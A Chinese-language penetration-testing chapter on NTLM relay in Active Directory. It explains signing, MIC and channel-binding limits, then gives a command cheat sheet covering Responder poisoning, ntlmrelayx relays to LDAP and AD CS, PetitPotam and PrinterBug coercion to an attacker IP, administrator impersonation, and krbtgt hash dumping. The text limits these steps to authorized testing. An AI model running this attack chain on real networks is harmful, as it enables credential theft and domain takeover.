# 第12章 NTLM 中继

## 基础

- NTLM 是挑战/应答协议；Net-NTLM Hash 用于网络认证，不是本地 SAM 中的 NTLM Hash。
- SMB/LDAP 签名会限制中继；LDAP 默认多为协商签名。
- MIC、EPA、Channel Binding 会影响中继利用。

## 中继目标

- SMB → HTTP/AD CS：申请证书。
- SMB → SMB：访问文件共享。
- SMB → LDAP/LDAPS：ACL、RBCD。
- 注意目标签名策略和 LDAPS 证书验证。

## 触发回连

- 被动：LLMNR/NetBIOS-NS、WPAD、DHCPv6。
- 主动：PrinterBug、PetitPotam、DFSCoerce、ShadowCoerce、PrivExchange。
- 仅限授权网段，避免在办公网大范围投毒。

## 工具

```bash
# 示例（授权环境）
python3 Responder.py -I eth0 -dwP
python3 ntlmrelayx.py -smb2support --remove-mic -t ldap://DC_IP
```

- Responder 与 ntlmrelayx 的 SMB/HTTP 模块不能冲突。
- 中继成功不等于获得域管；还需结合 ACL、RBCD、ADCS 等路径。
## 命令速查

### 触发与中继

```bash
# 被动投毒（授权网段）
Responder.py -I <IFACE> -dwP

# SMB -> LDAP/ADCS；窗口中关闭冲突模块
ntlmrelayx.py -smb2support --remove-mic -t ldap://<DC>
ntlmrelayx.py -smb2support --remove-mic -t http://<ADCS>/certsrv/certfnsh.asp --adcs --template DomainController

# RBCD 中继
ntlmrelayx.py --smb2support --remove-mic --delegate-access -t ldaps://<DC>
```

### 触发回连

```bash
printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET> <ATTACKER_IP>
PetitPotam.py <ATTACKER_IP> <TARGET> -pipe all
```

### 签名检查

```text
SMB 签名：Required 时通常不能中继到 SMB。
LDAP：默认多为协商签名；EPA/Channel Binding 会提高难度。
MIC 绕过：仅在授权测试中使用 --remove-mic，并确认目标补丁级别。
```

### 结果使用

```bash
getST.py -spn cifs/<DC_FQDN> <DOMAIN>/<MACHINE>$:<PASSWORD> -impersonate administrator -dc-ip <DC>
set KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass <DOMAIN>/administrator@<DC_FQDN> -just-dc-user krbtgt
```
